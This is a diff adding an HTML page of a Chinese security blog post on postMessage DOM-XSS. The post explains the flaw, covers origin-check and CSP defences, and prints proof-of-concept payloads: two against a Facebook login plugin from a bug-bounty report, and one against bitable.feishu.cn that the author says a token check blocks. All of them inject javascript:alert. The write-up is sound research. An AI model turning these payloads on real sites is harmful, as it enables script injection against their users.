@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang=&#34;en&#34;>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#070807">
+  <title>一处自嗨postMessage的dom-xss小记 · Deen&#39;s blog</title>
+  <link rel="icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/css/style.css?v=1.1.2"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><main class="site-shell">
+    <header class="site-header">
+  <nav class="site-nav" aria-label="Primary navigation">
+    
+      <a href="/">Home</a>
+    
+      <a href="/archives/">Archives</a>
+    
+      <a href="/about/">About</a>
+    
+  </nav>
+</header>
+<div class="header-rule" aria-hidden="true"></div>
+
+    <article class="post-detail" itemscope itemtype="https://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 itemprop="headline">一处自嗨postMessage的dom-xss小记</h1>
+    <p class="post-meta">
+      <time datetime="2021-02-12T13:46:22.000Z" itemprop="datePublished">2021-02-12</time>
+      
+    </p>
+  </header>
+  <div class="article-content" itemprop="articleBody"><h2 id="0x00-介绍-window-postMessage"><a href="#0x00-介绍-window-postMessage" class="headerlink" title="0x00 介绍 window.postMessage"></a>0x00 介绍 window.postMessage</h2><p>参考: <code>https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</code></p>
+<p>window.postMessage() 主要是解决跨源通信的。</p>
+<blockquote>
+<p>从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 targetWindow = window.opener），然后在窗口上调用 targetWindow.postMessage() 方法分发一个  MessageEvent 消息。接收</p>
+</blockquote>
+<h2 id="0x01-常出现的dom-xss-问题"><a href="#0x01-常出现的dom-xss-问题" class="headerlink" title="0x01 常出现的dom-xss 问题"></a>0x01 常出现的dom-xss 问题</h2><p><strong>其实就是引入了一个污点。</strong></p>
+<p>facebook给过一个2w刀的dom xss赏金——<a href="https://vinothkumar.me/20000-facebook-dom-xss/">https://vinothkumar.me/20000-facebook-dom-xss/</a></p>
+<p>看一下关键触发代码：</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3dFhU4gxfsg4tqKT3iTvzYNO9ScMZcn2UbRFr4A5NvWrhYPck2avmkRxj_VopQ52RroQM0JH7BrBgJCz6pgqGiX2_OlcczLp3Wh6pZ_G5gQ-kfhWpugoXuSdhQiIcHqwRsn-RRS6227mcEk3LBap58=w715-h126-no?authuser=0" alt="image"></p>
+<p>这里的i.url是攻击者可控的，就是postmessage传递过去的数据，然后window.open触发，利用javascript伪协议，就可以变成一个xss漏洞。</p>
+<h2 id="0x02-postMessage防护"><a href="#0x02-postMessage防护" class="headerlink" title="0x02 postMessage防护"></a>0x02 postMessage防护</h2><p>可以参考这篇：<a href="https://security.tencent.com/index.php/blog/msg/107">https://security.tencent.com/index.php/blog/msg/107</a></p>
+<p>简单来说就是校验orgin.</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3fB--e_cZG79QfPOS4K0f4bRkDBsnoyC9_E5lu8jUah4IF37NreGNFjzoIYKD14euFugjMVoiKAuv17MR4gtsWRr2uji0Vms3mwtKuCTvZdXX3Wa1GPT141CaD9B3KfLwv5gKevAgVYMmfWTBvG_cw=w821-h220-no?authuser=0" alt="image"></p>
+<p>还可以提高利用难度，如设置csp， <code>x-frame-options: DENY</code>。</p>
+<p>这个意思是禁止所有iframe加载这个网站.</p>
+<p>从postMessage dom-xss漏洞利用来看，存在两种方式，一种是iframe， 一种是window.open， 示例如下。这个csp设计</p>
+<p>Pop-up method:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> opener = <span class="built_in">window</span>.open(<span class="string">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span>,<span class="string">"opener"</span>, <span class="string">"scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1"</span>);</span></span><br><span class="line">   </span><br><span class="line"><span class="actionscript">   setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> message = &#123;<span class="string">"xdArbiterHandleMessage"</span>:<span class="literal">true</span>,<span class="string">"message"</span>:&#123;<span class="string">"method"</span>:<span class="string">"loginButtonStateInit"</span>,<span class="string">"params"</span>:<span class="built_in">JSON</span>.stringify(&#123;<span class="string">'call'</span>:&#123;<span class="string">'id'</span>:<span class="string">'123'</span>,<span class="string">'url'</span>:<span class="string">'javascript:alert(document.domain);'</span>,<span class="string">'size'</span>:&#123;<span class="string">'width'</span>:<span class="number">10</span>,<span class="string">'height'</span>:<span class="number">10</span>&#125;,<span class="string">'dims'</span>:&#123;<span class="string">'screenX'</span>:<span class="number">0</span>,<span class="string">'screenY'</span>:<span class="number">23</span>,<span class="string">'outerWidth'</span>:<span class="number">1680</span>,<span class="string">'outerHeight'</span>:<span class="number">971</span>,<span class="string">'screenWidth'</span>:<span class="number">1680</span>&#125;&#125;&#125;)&#125;,<span class="string">"origin"</span>:<span class="string">"ORIGIN"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">        opener.postMessage(message, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="actionscript">    &#125;,<span class="string">'4000'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Iframe method:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">fbFrameLoaded</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> iframeEl = <span class="built_in">document</span>.getElementById(<span class="string">'fbframe'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> message = &#123;<span class="string">"xdArbiterHandleMessage"</span>:<span class="literal">true</span>,<span class="string">"message"</span>:&#123;<span class="string">"method"</span>:<span class="string">"loginButtonStateInit"</span>,<span class="string">"params"</span>:<span class="built_in">JSON</span>.stringify(&#123;<span class="string">'call'</span>:&#123;<span class="string">'id'</span>:<span class="string">'123'</span>,<span class="string">'url'</span>:<span class="string">'javascript:alert(document.domain);'</span>,<span class="string">'size'</span>:&#123;<span class="string">'width'</span>:<span class="number">10</span>,<span class="string">'height'</span>:<span class="number">10</span>&#125;,<span class="string">'dims'</span>:&#123;<span class="string">'screenX'</span>:<span class="number">0</span>,<span class="string">'screenY'</span>:<span class="number">23</span>,<span class="string">'outerWidth'</span>:<span class="number">1680</span>,<span class="string">'outerHeight'</span>:<span class="number">971</span>,<span class="string">'screenWidth'</span>:<span class="number">1680</span>&#125;&#125;&#125;)&#125;,<span class="string">"origin"</span>:<span class="string">"ORIGIN"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">  iframeEl.contentWindow.postMessage(message, <span class="string">'*'</span>);</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"fbframe"</span> <span class="attr">src</span>=<span class="string">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span> <span class="attr">onload</span>=<span class="string">"fbFrameLoaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-bitable-feishu-cn站点自嗨dom-xss"><a href="#0x03-bitable-feishu-cn站点自嗨dom-xss" class="headerlink" title="0x03 bitable.feishu.cn站点自嗨dom-xss"></a>0x03 bitable.feishu.cn站点自嗨dom-xss</h2><ol>
+<li>漏洞触发代码，htmlpcindex开头的某个js文件。</li>
+</ol>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3cC4W4HxvOGbz6HEfLlnL1_VGXyn7DxHAp6uSXXJ4OV7zqNNmf_UXrd-oqZEF2wWEf0r3VUtM4k4Lr_V-I_v8c99StEC_YE510Ym84FzfCLdlf-oMVIDMATnoRuBhseFLnUM9WjZBMV05RLdnPX9uE=w1041-h164-no?authuser=0" alt="image"></p>
+<p><code>window.open(a.payload.url, &quot;_blank&quot;, &quot;noopener&quot;);</code> a为postmessage可控的数据。</p>
+<ol start="2">
+<li>设置了csp <img src="https://lh3.googleusercontent.com/pw/ACtC-3ev8dMoVLlp0aU5IROYchaBnNPJ6ofbu3PakrGD6iT973xG00fhyzfP7Cy976qG0n1Ly1N-VU1h5Xz31ctXFxcrF8pGnliTcA9-YWpITAsokXXnxUDJNORL5Rw_9X2fiT9OJQyuXDblTb4PzfGw7kI=w791-h910-no?authuser=0" alt="image"></li>
+<li>payload </li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> opener = <span class="built_in">window</span>.open(<span class="string">"https://bitable.feishu.cn/"</span>,<span class="string">"opener"</span>, <span class="string">"scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1"</span>);</span></span><br><span class="line"><span class="actionscript">   setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> message = &#123;<span class="string">"xdArbiterHandleMessage"</span>:<span class="literal">true</span>,<span class="string">"token"</span>:<span class="string">"VcX507E54v"</span>,<span class="string">"payload"</span>:&#123;<span class="string">"url"</span>:<span class="string">"javascript:alert(document.domain)"</span>,<span class="string">"target"</span>:<span class="string">"_self"</span>&#125;,<span class="string">"method"</span>:<span class="string">"navigator.change"</span>,<span class="string">"message"</span>:<span class="string">""</span>,<span class="string">"origin"</span>:<span class="string">"ORIGIN"</span>&#125;;</span></span><br><span class="line"><span class="actionscript">        opener.postMessage(message, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="actionscript">    &#125;,<span class="string">'1000'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我以为大功告成了，再看才发现还有个token校验，这个token还是个生成的10位随机数。</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3c1DB7w4khuL2v4D7Fv2mAD82YzjdJwIGPY_bQlq2ZOsoXWoT5GQBGGLmjQf09VsuSXy880JQhTtmSiPLGpYTRdDU7oJwSLXbByQP034bCSffB69tjBERiaccGhpGz-81r5nEYANZ0HQsWebQ45ojo=w1229-h28-no?authuser=0" alt="image"></p>
+<p>想办法绕过这个随机数。</p>
+<ol>
+<li>js伪随机数，不行</li>
+<li>趁token还是undefined的时候触发漏洞，不行，token生成一定在前面</li>
+</ol>
+<p>好吧，都行不通，终极白忙活。</p>
+<p>假装获取到token，合影留念……</p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3dkjiNnM0YBfvzE1HRQzoi-heIMFk0-r3vnLaJfNq1AFmtu9EBGPsWyCzYppz3pJMdg3dJY4I-cHEGWETk9xrJauoUstajbStiA-LqiafeFIUR-T_3yxrra8AHRCG4TfkaCkL3YQd5wbSVTrIydIyY=w1280-h746-no?authuser=0" alt="image"></p>
+</div>
+</article>
+
+    <footer class="site-footer">
+  Copyright © 2026 Deen&#39;s blog
+</footer>
+
+  </main>
+  <script>
+    (function () {
+      var terminal = document.querySelector('[data-terminal-intro]');
+      var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (!terminal || reduceMotion) return;
+
+      var introSeen = false;
+      try { introSeen = window.sessionStorage.getItem('deen-terminal-intro-seen') === '1'; } catch (error) {}
+      if (introSeen) return;
+      try { window.sessionStorage.setItem('deen-terminal-intro-seen', '1'); } catch (error) {}
+
+      var root = document.documentElement;
+      var lines = terminal.querySelectorAll('.terminal-command .terminal-typed');
+      var output = terminal.querySelector('.terminal-output');
+      var cursors = terminal.querySelectorAll('.terminal-cursor');
+      var list = document.querySelector('.post-list');
+      var pagination = document.querySelector('.terminal-status');
+      var text = Array.prototype.map.call(lines, function (line) { return line.textContent; });
+      var delay = function (milliseconds) { return new Promise(function (resolve) { window.setTimeout(resolve, milliseconds); }); };
+      var type = function (line, value) {
+        line.textContent = '';
+        return new Promise(function (resolve) {
+          var index = 0;
+          var tick = function () {
+            line.textContent += value.charAt(index++);
+            if (index < value.length) window.setTimeout(tick, 28);
+            else resolve();
+          };
+          tick();
+        });
+      };
+
+      root.classList.add('terminal-booting');
+      cursors[0].classList.add('is-active');
+      output.classList.remove('is-visible');
+      type(lines[0], text[0])
+        .then(function () {
+          cursors[0].classList.remove('is-active');
+          output.classList.add('is-visible');
+          return delay(260);
+        })
+        .then(function () { cursors[1].classList.add('is-active'); })
+        .then(function () { return type(lines[1], text[1]); })
+        .then(function () {
+          cursors[1].classList.remove('is-active');
+          Array.prototype.forEach.call(list.children, function (item, index) {
+            item.style.transitionDelay = (index * 42) + 'ms';
+            item.classList.add('is-visible');
+          });
+          if (pagination) pagination.classList.add('is-visible');
+          root.classList.remove('terminal-booting');
+        });
+    }());
+
+    document.querySelectorAll('.article-content .highlight').forEach(function (block) {
+      var code = block.querySelector('code, td.code, pre');
+      if (!code) return;
+      var className = block.className.split(/\s+/).find(function (name) { return name !== 'highlight'; });
+      var toolbar = document.createElement('div');
+      toolbar.className = 'code-toolbar';
+      toolbar.innerHTML = '<span class="code-controls" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-language"></span><button type="button" data-copy-code>Copy</button>';
+      toolbar.querySelector('.code-language').textContent = className || 'text';
+      block.prepend(toolbar);
+      var table = block.querySelector('table');
+      if (table) {
+        var scroller = document.createElement('div');
+        scroller.className = 'code-scroll';
+        table.parentNode.insertBefore(scroller, table);
+        scroller.appendChild(table);
+      }
+    });
+    document.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-copy-code]');
+      if (!button) return;
+      var code = button.closest('.highlight, .code-block').querySelector('code, td.code, pre');
+      if (!code || !navigator.clipboard) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        button.textContent = 'Copied';
+        window.setTimeout(function () { button.textContent = 'Copy'; }, 1400);
+      });
+    });
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
